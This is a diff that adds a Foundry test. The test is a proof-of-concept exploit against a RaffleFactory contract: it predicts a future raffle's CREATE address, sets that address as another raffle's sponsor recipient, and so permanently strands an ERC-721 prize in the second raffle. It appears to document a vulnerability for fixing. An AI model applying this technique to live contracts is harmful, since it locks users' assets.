@@ -1,0 +1,130 @@
+diff --git a/packages/contracts/test/foundry/FutureCloneRecipientPoC.t.sol b/packages/contracts/test/foundry/FutureCloneRecipientPoC.t.sol
+new file mode 100644
+index 0000000..e802432
+--- /dev/null
++++ b/packages/contracts/test/foundry/FutureCloneRecipientPoC.t.sol
+@@ -0,0 +1,124 @@
++// SPDX-License-Identifier: MIT
++pragma solidity 0.8.36;
++
++import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
++
++import { RaffleFactory } from "../../src/RaffleFactory.sol";
++import { IRaffle } from "../../src/interfaces/IRaffle.sol";
++import { IRaffleFactory } from "../../src/interfaces/IRaffleFactory.sol";
++
++interface PoCVm {
++    function getCode(string calldata artifactPath) external view returns (bytes memory creationBytecode);
++}
++
++/// @notice Minimal six-decimal quote-token dependency needed to deploy the real factory.
++contract PoCQuoteToken {
++    function decimals() external pure returns (uint8) {
++        return 6;
++    }
++}
++
++/// @notice Minimal wrapper dependency needed by VRFV2PlusWrapperConsumerBase's constructor.
++contract PoCVrfWrapper {
++    function link() external pure returns (address) {
++        return address(0xBEEF);
++    }
++}
++
++/// @notice Standards-compliant ERC-721 used for both real raffle prize deposits.
++contract PoCPrize is ERC721 {
++    constructor() ERC721("PoC Prize", "POC") {
++        _mint(msg.sender, 1);
++        _mint(msg.sender, 2);
++    }
++}
++
++/// @notice Prerequisite: Foundry with solc 0.8.36 available (the repository pins all Solidity imports).
++///         Run with:
++///         cd packages/contracts
++///         forge test --match-contract FutureCloneRecipientPoC -vvv
++///         Expected result: PASS; the emitted ExploitDemonstrated event reports raffle B as the stranded asset owner.
++///
++/// Attacker model: an ordinary, unprivileged sponsor owns and approves two ERC-721s and controls every
++/// CreateRaffleParams field. The sponsor needs no factory role and relies only on public CREATE address
++/// derivation. This test contract acts as that sponsor/helper and performs the two creations atomically.
++contract FutureCloneRecipientPoC {
++    PoCVm private constant VM = PoCVm(address(uint160(uint256(keccak256("hevm cheat code")))));
++
++    event ExploitDemonstrated(address indexed raffleA, address indexed raffleB, address strandedAssetOwner);
++
++    function testFutureCloneRecipientPermanentlyStrandsPrize() external {
++        PoCQuoteToken quoteToken = new PoCQuoteToken();
++        PoCVrfWrapper vrfWrapper = new PoCVrfWrapper();
++        RaffleFactory factory =
++            _deployFactory(abi.encode(address(quoteToken), address(vrfWrapper), address(0xCAFE)));
++        PoCPrize prize = new PoCPrize();
++        prize.setApprovalForAll(address(factory), true);
++
++        // A newly-created contract starts at nonce 1. The factory consumes nonce 1 when its constructor
++        // deploys raffleImplementation, so raffle A and raffle B are created at nonces 2 and 3 respectively.
++        address predictedRaffleB = _computeCreateAddress(address(factory), 3);
++        require(predictedRaffleB.code.length == 0, "future raffle unexpectedly already deployed");
++        require(!factory.isRaffle(predictedRaffleB), "future raffle unexpectedly registered");
++
++        // The snapshot-only validation accepts the still-code-less future raffle B as A's immutable recipient.
++        address raffleA = factory.createRaffle(
++            IRaffleFactory.CreateRaffleParams({
++                sponsorRecipient: predictedRaffleB,
++                prizeToken: address(prize),
++                prizeTokenId: 1,
++                reserveEntries: 1,
++                endTime: uint64(block.timestamp + 1 days)
++            })
++        );
++        require(raffleA != predictedRaffleB, "prediction selected raffle A instead of B");
++        require(IRaffle(raffleA).sponsorRecipient() == predictedRaffleB, "future recipient was not persisted");
++        require(predictedRaffleB.code.length == 0, "raffle B deployed too early");
++        require(!factory.isRaffle(predictedRaffleB), "raffle B registered too early");
++
++        // The very next successful creation materializes B at the sponsor-predicted address and registers it.
++        address raffleB = factory.createRaffle(
++            IRaffleFactory.CreateRaffleParams({
++                sponsorRecipient: address(this),
++                prizeToken: address(prize),
++                prizeTokenId: 2,
++                reserveEntries: 1,
++                endTime: uint64(block.timestamp + 1 days)
++            })
++        );
++        require(raffleB == predictedRaffleB, "second clone did not match CREATE prediction");
++        require(factory.isRaffle(raffleB), "raffle B was not registered");
++
++        // With no sales, the sponsor may immediately enter Refunding. releaseSponsorPrize uses unsafe
++        // transferFrom, so A's prize moves into B without invoking B's restrictive receiver callback.
++        IRaffle(raffleA).enableRefunds();
++        IRaffle(raffleA).releaseSponsorPrize();
++        require(prize.ownerOf(1) == raffleB, "A's prize was not transferred into raffle B");
++
++        // Complete B's only prize-return path. It returns B's configured token 2, but it cannot address the
++        // unrelated token 1 received from A. B has no arbitrary ERC-721 approval, transfer, or rescue boundary.
++        IRaffle(raffleB).enableRefunds();
++        IRaffle(raffleB).releaseSponsorPrize();
++        require(prize.ownerOf(2) == address(this), "B's configured prize was not normally returned");
++        require(prize.ownerOf(1) == raffleB, "A's untracked prize unexpectedly escaped raffle B");
++
++        emit ExploitDemonstrated(raffleA, raffleB, prize.ownerOf(1));
++    }
++
++    /// @dev RLP([deployer, nonce]) for the single-byte nonces used in this PoC (1 <= nonce <= 0x7f).
++    function _computeCreateAddress(address deployer, uint8 nonce) private pure returns (address predicted) {
++        require(nonce != 0 && nonce <= 0x7f, "nonce outside single-byte RLP range");
++        predicted = address(uint160(uint256(keccak256(abi.encodePacked(hex"d694", deployer, bytes1(nonce))))));
++    }
++
++    /// @dev Loads the already-compiled production artifact so its large initcode is not embedded in this test.
++    function _deployFactory(bytes memory constructorArgs) private returns (RaffleFactory factory) {
++        bytes memory initcode = abi.encodePacked(VM.getCode("RaffleFactory.sol:RaffleFactory"), constructorArgs);
++        address deployed;
++        assembly ("memory-safe") {
++            deployed := create(0, add(initcode, 0x20), mload(initcode))
++        }
++        require(deployed != address(0), "factory deployment failed");
++        factory = RaffleFactory(deployed);
++    }
++}
